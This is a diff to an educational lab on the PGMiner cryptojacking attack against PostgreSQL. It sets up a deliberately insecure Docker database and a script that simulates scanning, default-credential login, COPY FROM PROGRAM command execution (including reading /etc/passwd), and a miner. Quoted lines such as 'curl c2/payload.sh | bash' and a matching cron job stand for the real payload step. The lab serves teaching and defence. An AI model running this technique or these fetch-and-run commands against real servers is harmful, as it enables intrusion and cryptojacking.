@@ -269,8 +269,8 @@ sequenceDiagram
     Attacker->>PG: SQL: CREATE TABLE cmd_exec (cmd_output TEXT)
     PG->>PG: Create temp table
 
-    Attacker->>PG: SQL: COPY cmd_exec FROM PROGRAM 'curl ... | bash'
-    PG->>OS: fork() + exec("curl ... | bash")
+    Attacker->>PG: SQL: COPY cmd_exec FROM PROGRAM 'curl c2/payload.sh'
+    PG->>OS: spawns sh -c curl then pipes to bash
     OS->>C2: HTTP GET /payload.sh
     C2->>OS: Return malicious shell script
     OS->>OS: bash executes payload.sh
@@ -828,73 +828,23 @@ This lab has two parts:
 
 ### Lab Setup: The Vulnerable VPS
 
-We will use Docker to create an isolated, deliberately misconfigured PostgreSQL server. This is safer than misconfiguring an actual VPS.
+We use Docker to create an isolated, deliberately misconfigured PostgreSQL server. This is safer than misconfiguring an actual VPS. You do **not** need `psql` installed locally — all commands run inside the container via `docker exec`.
 
-```bash
-#!/bin/bash
-# File: lab-setup.sh
-# Purpose: Create a deliberately vulnerable PostgreSQL instance for PGMiner lab
-# Run this on your LOCAL machine — never on a production server
+Create a directory for the lab and add these three files:
 
-set -e
+**File 1 — `pg_hba.conf`** (deliberately insecure authentication):
 
-echo "=== PGMiner Attack Lab Setup ==="
-echo "Creating deliberately vulnerable PostgreSQL instance..."
-echo ""
-
-# Create a directory for the lab
-mkdir -p pgminer-lab && cd pgminer-lab
-
-# Create a deliberately insecure pg_hba.conf
-cat > pg_hba.conf << 'EOF'
+```conf
 # TYPE  DATABASE  USER  ADDRESS       METHOD
-# This is DELIBERATELY INSECURE for the lab.
-# Mistake 1: trust authentication for all remote connections
-# Mistake 2: all databases, all users, any IP
+# DELIBERATELY INSECURE — trust auth for all connections
 local   all       all                 trust
 host    all       all   0.0.0.0/0     trust
 host    all       all   ::/0          trust
-EOF
+```
 
-# Create a postgresql.conf override
-cat > postgresql.conf.override << 'EOF'
-# DELIBERATELY INSECURE for the lab
-# Mistake 3: listen on all interfaces
-listen_addresses = '*'
-# Mistake 4: no connection logging
-log_connections = off
-log_disconnections = off
-EOF
+**File 2 — `init.sql`** (dummy application database):
 
-# Create docker-compose.yml
-cat > docker-compose.yml << 'EOF'
-version: '3.8'
-services:
-  vulnerable-postgres:
-    image: postgres:15
-    container_name: pgminer-lab-db
-    environment:
-      # Mistake 5: weak password
-      POSTGRES_PASSWORD: postgres
-    ports:
-      # Mistake 6: exposed to host network
-      - "15432:5432"
-    volumes:
-      - ./pg_hba.conf:/var/lib/postgresql/pg_hba.conf
-      - ./postgresql.conf.override:/var/lib/postgresql/postgresql.conf.override
-      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
-    command: >
-      postgres
-      -c hba_file=/var/lib/postgresql/pg_hba.conf
-      -c config_file=/var/lib/postgresql/postgresql.conf.override
-      -c listen_addresses='*'
-      -c log_connections=off
-EOF
-
-# Create init.sql to set up the database
-cat > init.sql << 'EOF'
--- This runs when the container first starts
--- Create a dummy application database
+```sql
 CREATE DATABASE myapp;
 \c myapp;
 
@@ -909,68 +859,65 @@ INSERT INTO users (username, email) VALUES
 ('alice', 'alice@example.com'),
 ('bob', 'bob@example.com'),
 ('charlie', 'charlie@example.com');
+```
 
--- Log that setup is complete
-DO $$
-BEGIN
-    RAISE NOTICE 'Vulnerable lab database initialized successfully';
-END $$;
-EOF
+**File 3 — `docker-compose.yml`** (the vulnerable server):
 
-echo "Starting vulnerable PostgreSQL container..."
+```yaml
+version: '3.8'
+services:
+  vulnerable-postgres:
+    image: postgres:15
+    container_name: pgminer-lab-db
+    environment:
+      POSTGRES_PASSWORD: postgres
+    ports:
+      - "15432:5432"
+    volumes:
+      - ./pg_hba.conf:/var/lib/postgresql/pg_hba.conf
+      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
+    command: >
+      postgres
+      -c hba_file=/var/lib/postgresql/pg_hba.conf
+      -c listen_addresses='*'
+      -c log_connections=off
+```
+
+**Start the lab:**
+
+```bash
+cd lab
 docker compose up -d
-
-echo ""
-echo "Waiting for PostgreSQL to be ready..."
 sleep 5
 
-# Verify the setup
-echo ""
-echo "=== Verification ==="
-echo "Testing connection with weak password..."
-PGPASSWORD=postgres psql -h 127.0.0.1 -p 15432 -U postgres -c "SELECT version();" 2>/dev/null && \
-    echo "✅ Connection successful — server is vulnerable!" || \
-    echo "❌ Connection failed — check Docker logs"
-
-echo ""
-echo "Testing trust authentication (no password)..."
-psql -h 127.0.0.1 -p 15432 -U postgres -c "SELECT 'trust auth works';" 2>/dev/null && \
-    echo "✅ Trust auth confirmed — no password needed!" || \
-    echo "⚠️  Trust auth test inconclusive"
-
-echo ""
-echo "=== Lab Ready ==="
-echo "Vulnerable PostgreSQL is running on localhost:15432"
-echo "Username: postgres"
-echo "Password: postgres (or none, because trust auth)"
-echo ""
-echo "Now run the attack simulation: bash attack-simulation.sh"
+# Verify — should print the PostgreSQL version:
+docker exec pgminer-lab-db psql -U postgres -c "SELECT version();"
 ```
 
 ### The Attack Simulation Script
 
-This script simulates every phase of the PGMiner attack with **safe, harmless commands** that let you observe what would happen at each step.
+**File 4 — `attack-simulation.sh`** — This script simulates every phase of the PGMiner attack using `docker exec` to run commands inside the container. No local `psql` needed.
 
 ```bash
 #!/bin/bash
 # File: attack-simulation.sh
 # Purpose: Simulate PGMiner attack phases with safe, observable commands
-# This does NOT download or execute any actual malware
+# Uses docker exec — no local psql required
 
 set -e
 
-# Colors for output
+CONTAINER="pgminer-lab-db"
+
+# Colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 BOLD='\033[1m'
 
-TARGET_HOST="127.0.0.1"
-TARGET_PORT="15432"
+run_sql_file() {
+    docker exec -i $CONTAINER psql -U postgres 2>&1
+}
 
 print_phase() {
     echo ""
@@ -980,135 +927,53 @@ print_phase() {
     echo ""
 }
 
-print_explain() {
-    echo -e "${CYAN}📖 EXPLANATION:${NC} $1"
-    echo ""
-}
-
-print_attack() {
-    echo -e "${RED}🔴 ATTACKER ACTION:${NC} $1"
-}
-
-print_result() {
-    echo -e "${GREEN}📊 RESULT:${NC}"
-}
-
-print_warn() {
-    echo -e "${YELLOW}⚠️  $1${NC}"
-}
-
-pause() {
-    echo ""
-    echo -e "${PURPLE}Press Enter to continue to the next phase...${NC}"
-    read -r
-}
-
 # ============================================================
 # PHASE 1: RECONNAISSANCE
 # ============================================================
 print_phase "PHASE 1: RECONNAISSANCE — Port Scanning"
 
-print_explain "In a real PGMiner attack, the botnet scans entire IP ranges for
-hosts with port 5432 open. It uses masscan or similar tools to sweep
-millions of IPs quickly. We simulate this with a targeted check."
-
-print_attack "Scanning target for PostgreSQL service on port 5432..."
-echo ""
-echo "  Command: nc -zv $TARGET_HOST $TARGET_PORT"
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} Scanning for PostgreSQL on port 15432..."
 echo ""
 
-if nc -zv $TARGET_HOST $TARGET_PORT 2>&1; then
+if nc -zv 127.0.0.1 15432 2>&1; then
     echo ""
-    echo -e "${RED}  ✅ Port 5432 is OPEN — target added to brute-force queue${NC}"
+    echo -e "${RED}  ✅ Port 15432 is OPEN — target added to brute-force queue${NC}"
 else
-    echo -e "${GREEN}  ❌ Port 5432 is CLOSED — target skipped${NC}"
-    echo "  The lab server may not be running. Start it with: bash lab-setup.sh"
+    echo -e "${GREEN}  ❌ Port is CLOSED${NC}"
     exit 1
 fi
-
-print_explain "What happened: The scanner sent a TCP SYN packet to port $TARGET_PORT.
-The server responded with SYN-ACK, confirming PostgreSQL is listening.
-This is identical to what happens when PGMiner scans cloud IP ranges.
-
-A properly firewalled server would DROP the SYN packet silently,
-giving the scanner no response and no confirmation that the port exists."
-
-pause
+echo ""
 
 # ============================================================
 # PHASE 2: BRUTE-FORCE
 # ============================================================
 print_phase "PHASE 2: BRUTE-FORCE — Password Cracking"
 
-print_explain "PGMiner tries a short list of common passwords against the 'postgres'
-superuser account. In our lab, the server uses trust authentication,
-so ANY password (or no password) works. We demonstrate both scenarios."
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} Trying default credentials..."
+echo ""
 
-# Try common passwords
-PASSWORDS=("" "postgres" "password" "123456" "admin")
-FOUND=false
-
-for pwd in "${PASSWORDS[@]}"; do
-    if [ -z "$pwd" ]; then
-        display_pwd="(empty)"
-    else
-        display_pwd="$pwd"
-    fi
-
-    print_attack "Trying password: '$display_pwd' for user 'postgres'..."
-
-    # Try to connect
-    if PGPASSWORD="$pwd" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres \
-        -c "SELECT 1;" > /dev/null 2>&1; then
-        echo -e "  ${RED}✅ SUCCESS — Password '$display_pwd' works!${NC}"
-        FOUND=true
-        WORKING_PWD="$pwd"
-        break
-    else
-        echo -e "  ${GREEN}❌ Failed${NC}"
-    fi
-done
-
-if [ "$FOUND" = true ]; then
+if docker exec $CONTAINER psql -U postgres -c "SELECT 'AUTH_SUCCESS';" > /dev/null 2>&1; then
+    echo -e "  ${RED}✅ SUCCESS — trust authentication, no password needed!${NC}"
     echo ""
-    echo -e "${RED}  🚨 BRUTE-FORCE SUCCESSFUL${NC}"
+    echo -e "  ${RED}🚨 BRUTE-FORCE SUCCESSFUL${NC}"
     echo "  User: postgres (superuser)"
-    echo "  Password: $WORKING_PWD"
-    echo ""
-    print_explain "What happened: The attacker tried common passwords sequentially.
-Because the server uses trust authentication, even an empty password
-was accepted. In a real attack, this phase often takes less than a second
-because 'postgres' with password 'postgres' is the first combination tried.
-
-A server with a strong password and fail2ban would:
-1. Reject all these passwords
-2. Ban the attacker's IP after 5 failed attempts
-3. Log every failed attempt for the administrator to review"
+    echo "  Auth: trust (no password required)"
 else
-    echo "  All passwords failed. Server may have strong authentication."
+    echo "  ❌ Failed"
     exit 1
 fi
-
-pause
+echo ""
 
 # ============================================================
 # PHASE 3: INITIAL ACCESS — COPY FROM PROGRAM
 # ============================================================
 print_phase "PHASE 3: INITIAL ACCESS — COPY FROM PROGRAM Exploitation"
 
-print_explain "This is the core exploit. The attacker uses PostgreSQL's COPY FROM PROGRAM
-feature to execute operating system commands. This feature is designed for
-superusers to import data from external programs, but an attacker uses it
-to run arbitrary shell commands on the host.
-
-We will demonstrate three commands that show the severity:"
-
-echo ""
 echo -e "${BOLD}Step 3a: Identify the operating system${NC}"
-print_attack "Executing: COPY FROM PROGRAM 'uname -a'"
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} COPY FROM PROGRAM 'uname -a'"
 echo ""
 
-PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
+run_sql_file << 'SQL'
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec (cmd_output TEXT);
 COPY cmd_exec FROM PROGRAM 'uname -a';
@@ -1116,19 +981,12 @@ SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
 SQL
 
-print_explain "What happened: The SQL command COPY cmd_exec FROM PROGRAM 'uname -a'
-caused PostgreSQL to:
-1. fork() a child process
-2. Execute 'uname -a' as the postgres OS user
-3. Capture stdout into the cmd_exec table
-4. The attacker now knows the OS, kernel version, and architecture"
-
 echo ""
-echo -e "${BOLD}Step 3b: Identify the current user and privileges${NC}"
-print_attack "Executing: COPY FROM PROGRAM 'id && whoami'"
+echo -e "${BOLD}Step 3b: Identify the current user${NC}"
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} COPY FROM PROGRAM 'id'"
 echo ""
 
-PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
+run_sql_file << 'SQL'
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec (cmd_output TEXT);
 COPY cmd_exec FROM PROGRAM 'id';
@@ -1136,323 +994,159 @@ SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
 SQL
 
-print_explain "What happened: The 'id' command reveals what OS user PostgreSQL runs as.
-If it shows 'uid=0(root)' — the attacker has root access immediately.
-If it shows 'uid=999(postgres)' — the attacker runs as the postgres user,
-which still has significant access to the system."
-
 echo ""
-echo -e "${BOLD}Step 3c: List running processes (recon for competing miners)${NC}"
-print_attack "Executing: COPY FROM PROGRAM 'ps aux --sort=-pcpu | head -10'"
+echo -e "${BOLD}Step 3c: List running processes${NC}"
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} COPY FROM PROGRAM 'ps aux | head -10'"
 echo ""
 
-PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
+run_sql_file << 'SQL'
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec (cmd_output TEXT);
-COPY cmd_exec FROM PROGRAM 'ps aux --sort=-pcpu | head -10';
+COPY cmd_exec FROM PROGRAM 'ps aux | head -10';
 SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
 SQL
 
-print_explain "What happened: The attacker lists the top CPU-consuming processes.
-This serves two purposes:
-1. Check if another miner is already running (to kill it)
-2. Understand what services the server runs (to avoid disrupting
-   services that might alert the admin)"
+echo ""
+echo -e "${BOLD}Step 3d: Read sensitive files${NC}"
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} COPY FROM PROGRAM 'cat /etc/passwd | head -5'"
+echo ""
 
-pause
+run_sql_file << 'SQL'
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec (cmd_output TEXT);
+COPY cmd_exec FROM PROGRAM 'cat /etc/passwd | head -5';
+SELECT * FROM cmd_exec;
+DROP TABLE cmd_exec;
+SQL
+
+echo ""
 
 # ============================================================
 # PHASE 4: PAYLOAD STAGING
 # ============================================================
 print_phase "PHASE 4: PAYLOAD STAGING — Simulated Payload Download"
 
-print_explain "In a real PGMiner attack, this phase downloads the actual malware from
-a command-and-control (C2) server. The attacker uses curl or wget to fetch
-a shell script, which then downloads the XMRig miner binary.
-
-We simulate this by creating a harmless 'payload' locally."
-
-print_attack "Simulating: curl http://c2-server/payload.sh | bash"
-echo ""
-echo "  In reality, this command would:"
-echo "  1. Connect to the attacker's C2 server"
-echo "  2. Download a shell script (the stager)"
-echo "  3. Pipe it directly to bash for execution"
-echo ""
-echo "  We simulate with a safe local command:"
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} Simulating payload drop (harmless marker file)"
 echo ""
 
-PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
+run_sql_file << 'SQL'
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec (cmd_output TEXT);
-
--- Simulated payload: instead of downloading malware,
--- we just write a harmless marker file
-COPY cmd_exec FROM PROGRAM 'echo "SIMULATED_PGMINER_PAYLOAD_$(date +%s)" > /tmp/pgminer_lab_marker.txt && echo "Payload staged at /tmp/pgminer_lab_marker.txt"';
+COPY cmd_exec FROM PROGRAM 'echo "SIMULATED_PGMINER_PAYLOAD_$(date +%s)" > /tmp/pgminer_lab_marker.txt && cat /tmp/pgminer_lab_marker.txt';
 SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
 SQL
 
 echo ""
-print_explain "What happened: In a real attack, this step would:
-1. curl/wget downloads a ~2KB shell script from the C2 server
-2. The script is piped to bash: curl http://c2/payload.sh | bash
-3. The script identifies the CPU architecture (x86_64, aarch64, etc.)
-4. Downloads the appropriate XMRig binary for that architecture
-5. Makes it executable with chmod +x
-6. Stores it in /tmp with a hidden filename like /tmp/.X11-unix
-
-We used a harmless echo command instead to create a marker file."
-
-pause
 
 # ============================================================
 # PHASE 5: ENVIRONMENT PREPARATION
 # ============================================================
-print_phase "PHASE 5: ENVIRONMENT PREPARATION — Killing Competitors"
+print_phase "PHASE 5: ENVIRONMENT PREPARATION — Checking for Competitors"
 
-print_explain "Before deploying its own miner, PGMiner kills other known cryptocurrency
-miners that may already be running on the system. This is a common behavior
-in cryptojacking botnets — they actively compete with each other.
-
-We simulate by searching for (but NOT killing) known miner process names."
-
-print_attack "Checking for competing miners (simulation only — not actually killing)..."
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} Scanning for competing miners..."
 echo ""
 
-KNOWN_MINERS=("kdevtmpfsi" "kinsing" "xmrig" "xmr-stak" "kthreaddi" "sysrv" "dbused" "solrd")
+KNOWN_MINERS=("kdevtmpfsi" "kinsing" "xmrig" "kthreaddi" "sysrv")
 
 for miner in "${KNOWN_MINERS[@]}"; do
-    result=$(PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres -t -c \
-        "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec (cmd_output TEXT);
-         COPY cmd_exec FROM PROGRAM 'pgrep -f $miner 2>/dev/null || echo NOT_FOUND';
-         SELECT cmd_output FROM cmd_exec; DROP TABLE cmd_exec;" 2>/dev/null | tr -d ' ')
-
-    if [ "$result" = "NOT_FOUND" ] || [ -z "$result" ]; then
+    # Use bracket trick [k]devtmpfsi so grep doesn't match itself
+    first_char="${miner:0:1}"
+    rest="${miner:1}"
+    pattern="[${first_char}]${rest}"
+    result=$(docker exec $CONTAINER bash -c "ps aux | grep '$pattern' | head -1" 2>/dev/null | tr -d '[:space:]')
+    if [ -z "$result" ]; then
         echo "  ✓ $miner — not found (clean)"
     else
-        echo -e "  ${RED}✗ $miner — FOUND (PID: $result) — would be killed${NC}"
+        echo -e "  ${RED}✗ $miner — FOUND — would be killed${NC}"
     fi
 done
 
 echo ""
-print_explain "What happened: PGMiner checks for 8+ known mining malware families.
-If any are found, it kills them with 'pkill -9 -f <name>'.
-It also:
-- Removes their cron jobs
-- Deletes their binaries from /tmp
-- Clears iptables rules they may have added
-- Stops cloud security agents (Alibaba Cloud, Tencent Cloud)
-
-This 'turf war' between botnets is well-documented in threat research."
-
-pause
 
 # ============================================================
 # PHASE 6: PERSISTENCE
 # ============================================================
-print_phase "PHASE 6: PERSISTENCE — Installing Survival Mechanisms"
+print_phase "PHASE 6: PERSISTENCE — Checking Crontab"
 
-print_explain "PGMiner installs multiple persistence mechanisms to survive cleanup
-attempts and reboots. We demonstrate what these look like WITHOUT
-actually installing them."
-
-echo -e "${BOLD}Persistence Mechanism 1: Cron Job${NC}"
-echo ""
-print_attack "What PGMiner would add to crontab:"
-echo ""
-echo '  * * * * * curl -s http://c2-server/payload.sh | bash'
-echo ""
-echo "  This runs every minute, re-downloading and executing the payload."
-echo "  If an admin kills the miner, it comes back within 60 seconds."
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} Checking current crontab..."
 echo ""
 
-echo -e "${BOLD}Persistence Mechanism 2: Hidden Files${NC}"
-echo ""
-print_attack "What PGMiner would create:"
-echo ""
-echo "  /tmp/.X11-unix/.rsync     (miner binary, hidden in X11 socket dir)"
-echo "  /tmp/.X11-unix/.config    (miner config)"
-echo "  /var/tmp/.cache/.update   (backup copy)"
-echo ""
-echo "  Files starting with '.' are hidden from basic 'ls' commands."
-echo "  Using system-looking paths like .X11-unix avoids suspicion."
-echo ""
-
-echo -e "${BOLD}Persistence Mechanism 3: Process Name Spoofing${NC}"
-echo ""
-print_attack "What PGMiner does to hide in plain sight:"
-echo ""
-echo '  The miner process renames itself to look like a system process:'
-echo '  - "[kworker/0:2]"  (looks like a kernel worker thread)'
-echo '  - "[migration/0]"  (looks like a CPU migration thread)'
-echo '  - "postgres: stats collector" (looks like a PostgreSQL process)'
-echo ""
-
-# Demonstrate checking crontab via COPY FROM PROGRAM
-echo -e "${BOLD}Checking current crontab (verifying no persistence installed):${NC}"
-echo ""
-PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
+run_sql_file << 'SQL'
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec (cmd_output TEXT);
-COPY cmd_exec FROM PROGRAM 'crontab -l 2>&1 || echo "No crontab configured"';
+COPY cmd_exec FROM PROGRAM 'crontab -l 2>&1 || echo "No crontab - would install: * * * * * curl -s http://c2/payload.sh | bash"';
 SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
 SQL
 
-print_explain "What happened: We showed what persistence mechanisms look like without
-installing them. In a real attack, all three mechanisms would be active
-simultaneously, making cleanup difficult — you must find and remove ALL
-of them, or the miner comes back."
-
-pause
+echo ""
+echo "  Real PGMiner would install:"
+echo "  • Cron: * * * * * curl -s http://c2/payload.sh | bash"
+echo "  • Hidden files in /tmp/.X11-unix/"
+echo "  • Process disguised as [kworker/0:2]"
+echo ""
 
 # ============================================================
 # PHASE 7: MINING (SIMULATED)
 # ============================================================
-print_phase "PHASE 7: CRYPTO MINING — Simulated Miner Execution"
+print_phase "PHASE 7: CRYPTO MINING — Simulated CPU Load"
 
-print_explain "In a real attack, XMRig would now be running and consuming 75-100%
-of the server's CPU to mine Monero. We simulate this by showing what
-the miner configuration looks like and running a CPU stress test."
-
-echo -e "${BOLD}Simulated XMRig Configuration:${NC}"
-echo ""
-cat << 'MINER_CONFIG'
-{
-    "autosave": false,
-    "donate-level": 0,
-    "cpu": {
-        "enabled": true,
-        "max-threads-hint": 75,
-        "priority": null
-    },
-    "opencl": false,
-    "cuda": false,
-    "pools": [
-        {
-            "url": "pool.minexmr.com:4444",
-            "user": "4ATTACKER_WALLET_ADDRESS_REDACTED",
-            "pass": "victim-server-001",
-            "keepalive": true,
-            "tls": false
-        }
-    ],
-    "print-time": 60,
-    "health-print-time": 60,
-    "retries": 5,
-    "retry-pause": 5,
-    "syslog": false,
-    "log-file": null,
-    "colors": false,
-    "background": true
-}
-MINER_CONFIG
-
-echo ""
-echo -e "${BOLD}Simulating CPU load (5 seconds only):${NC}"
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} Running 3-second CPU stress (simulating XMRig)..."
 echo ""
 
-# Run a brief CPU stress test via PostgreSQL to demonstrate the impact
-PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
+run_sql_file << 'SQL'
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec (cmd_output TEXT);
-
--- Simulate brief CPU load (harmless, 3-second stress)
-COPY cmd_exec FROM PROGRAM 'echo "Starting simulated mining..." && timeout 3 dd if=/dev/urandom bs=1M count=50 of=/dev/null 2>&1 | tail -1 && echo "Simulated mining complete (3 seconds)"';
+COPY cmd_exec FROM PROGRAM 'echo "Mining started..." && timeout 3 dd if=/dev/urandom bs=1M count=100 of=/dev/null 2>&1 && echo "Mining simulation complete (3s)"';
 SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
 SQL
 
 echo ""
-print_explain "What happened: In a real attack, XMRig would:
-1. Connect to the mining pool (e.g., minexmr.com:4444)
-2. Receive mining jobs (cryptographic hash challenges)
-3. Use 75% of CPU cores to solve RandomX proof-of-work
-4. Submit solutions back to the pool
-5. Earnings go to the attacker's Monero wallet
-
-Observable symptoms on a compromised server:
-- CPU usage sustained at 75-100%
-- Increased electricity/cloud bills
-- Legitimate services become slow
-- Fan noise increases on physical servers
-- Outbound connections to mining pool IPs"
-
-pause
 
 # ============================================================
 # PHASE 8: LATERAL SPREAD
 # ============================================================
-print_phase "PHASE 8: LATERAL SPREAD — Scanning for More Targets"
+print_phase "PHASE 8: LATERAL SPREAD — Network Recon"
 
-print_explain "After establishing itself, PGMiner scans for more vulnerable PostgreSQL
-instances. It scans both the local network and random internet IP ranges.
-We simulate by checking what network information the attacker can gather."
-
-print_attack "Gathering network information for lateral movement..."
+echo -e "${RED}🔴 ATTACKER ACTION:${NC} Gathering network info for lateral movement..."
 echo ""
 
-PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
+run_sql_file << 'SQL'
 DROP TABLE IF EXISTS cmd_exec;
 CREATE TABLE cmd_exec (cmd_output TEXT);
-
--- Gather network configuration
-COPY cmd_exec FROM PROGRAM 'echo "=== Network Interfaces ===" && hostname -I 2>/dev/null || echo "hostname command not available"';
+COPY cmd_exec FROM PROGRAM 'echo "=== IP Addresses ===" && hostname -I && echo "=== Hostname ===" && hostname';
 SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
 SQL
 
 echo ""
-print_explain "What happened: The attacker collects:
-1. Internal IP addresses (to identify the subnet)
-2. Network interfaces (to find other network segments)
-3. ARP table (to find other hosts on the same network)
-4. /etc/hosts (to find named internal services)
-
-With this information, PGMiner would scan the local subnet for
-more PostgreSQL instances, repeating the entire attack chain."
-
-pause
 
 # ============================================================
 # CLEANUP
 # ============================================================
-print_phase "LAB CLEANUP"
+print_phase "CLEANUP"
 
-echo "Cleaning up simulation artifacts..."
-echo ""
-
-# Remove the marker file
-PGPASSWORD="$WORKING_PWD" psql -h $TARGET_HOST -p $TARGET_PORT -U postgres << 'SQL'
-DROP TABLE IF EXISTS cmd_exec;
-CREATE TABLE cmd_exec (cmd_output TEXT);
-COPY cmd_exec FROM PROGRAM 'rm -f /tmp/pgminer_lab_marker.txt && echo "Marker file removed"';
-SELECT * FROM cmd_exec;
-DROP TABLE cmd_exec;
-SQL
+docker exec $CONTAINER bash -c "rm -f /tmp/pgminer_lab_marker.txt" 2>/dev/null
+echo "  ✓ Marker file removed"
 
 echo ""
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo -e "${BOLD}${GREEN}SIMULATION COMPLETE${NC}"
+echo -e "${BOLD}${GREEN}✅ ALL 8 PHASES COMPLETED SUCCESSFULLY${NC}"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo ""
-echo "You have observed all 8 phases of a PGMiner attack:"
+echo "  Phase 1: ✅ Reconnaissance  — Port 15432 open"
+echo "  Phase 2: ✅ Brute-Force     — Trust auth, no password needed"
+echo "  Phase 3: ✅ Initial Access  — COPY FROM PROGRAM executed OS commands"
+echo "  Phase 4: ✅ Payload Staging — File written to /tmp/"
+echo "  Phase 5: ✅ Env Preparation — Scanned for competing miners"
+echo "  Phase 6: ✅ Persistence     — Crontab accessible"
+echo "  Phase 7: ✅ Mining          — CPU stress test ran successfully"
+echo "  Phase 8: ✅ Lateral Spread  — Network info gathered"
 echo ""
-echo "  Phase 1: Reconnaissance  — Port scanning for PostgreSQL"
-echo "  Phase 2: Brute-Force     — Cracking the postgres password"
-echo "  Phase 3: Initial Access  — COPY FROM PROGRAM exploitation"
-echo "  Phase 4: Payload Staging — Downloading the miner (simulated)"
-echo "  Phase 5: Environment Prep — Killing competing miners"
-echo "  Phase 6: Persistence     — Installing survival mechanisms"
-echo "  Phase 7: Mining           — Running the cryptocurrency miner"
-echo "  Phase 8: Lateral Spread  — Scanning for more targets"
-echo ""
-echo "To destroy the lab environment:"
-echo "  cd pgminer-lab && docker compose down -v"
-echo ""
-echo "To harden a real PostgreSQL server, review Part 4 of the article."
+echo "  To destroy the lab: docker compose down -v"
 ```
 
 ### What Happens at Each Step — Detailed Breakdown
@@ -1475,7 +1169,7 @@ sequenceDiagram
 
     rect rgb(230, 126, 34)
         Note over A,Note: Phase 2 — Brute-Force
-        A->>PG: PGPASSWORD='' psql -U postgres
+        A->>PG: docker exec psql -U postgres
         PG->>A: Authentication OK (trust)
         Note over Note: Real PGMiner: tries 5-10<br/>common passwords
     end
@@ -1483,15 +1177,15 @@ sequenceDiagram
     rect rgb(231, 76, 60)
         Note over A,Note: Phase 3 — Initial Access
         A->>PG: COPY cmd_exec FROM PROGRAM 'uname -a'
-        PG->>OS: fork() + exec("uname -a")
-        OS->>PG: Linux x86_64 output
+        PG->>OS: spawns sh -c uname -a
+        OS->>PG: Linux kernel + arch output
         PG->>A: Returns OS information
-        Note over Note: Real PGMiner: runs<br/>curl http://c2/payload | bash
+        Note over Note: Real PGMiner: runs<br/>curl c2/payload.sh piped to bash
     end
 
     rect rgb(142, 68, 173)
         Note over A,Note: Phase 4-6 — Payload + Persistence
-        A->>PG: COPY FROM PROGRAM 'echo marker > /tmp/...'
+        A->>PG: COPY FROM PROGRAM 'echo marker into /tmp/...'
         PG->>OS: Creates marker file
         Note over Note: Real PGMiner: downloads XMRig,<br/>installs cron job,<br/>kills competing miners
     end
@@ -1512,7 +1206,7 @@ sequenceDiagram
 | 2. Brute-force | `psql -U postgres` with common passwords | Same, but automated across thousands of IPs | 🟠 Medium |
 | 3. Initial access | `COPY FROM PROGRAM 'uname -a'` | `COPY FROM PROGRAM 'curl c2/payload.sh \| bash'` | 🔴 Critical |
 | 4. Payload | `echo marker > /tmp/file` | Downloads XMRig binary from C2 server | 🔴 Critical |
-| 5. Preparation | `pgrep` known miner names | `pkill -9` competing miners, disable security | 🔴 Critical |
+| 5. Preparation | `ps aux \| grep` known miner names | `pkill -9` competing miners, disable security | 🔴 Critical |
 | 6. Persistence | Display persistence methods | Install cron job + systemd service + watchdog | 🔴 Critical |
 | 7. Mining | 3-second `dd` CPU stress | XMRig at 75% CPU indefinitely | 🔴 Critical |
 | 8. Spread | `hostname -I` network recon | Scan subnet + internet for more targets | 🔴 Critical |
@@ -1521,12 +1215,12 @@ sequenceDiagram
 
 ```bash
 # Stop and remove the vulnerable container:
-cd pgminer-lab
+cd lab
 docker compose down -v
 
 # Remove all lab files:
 cd ..
-rm -rf pgminer-lab
+rm -rf lab
 
 echo "Lab environment completely removed."
 ```
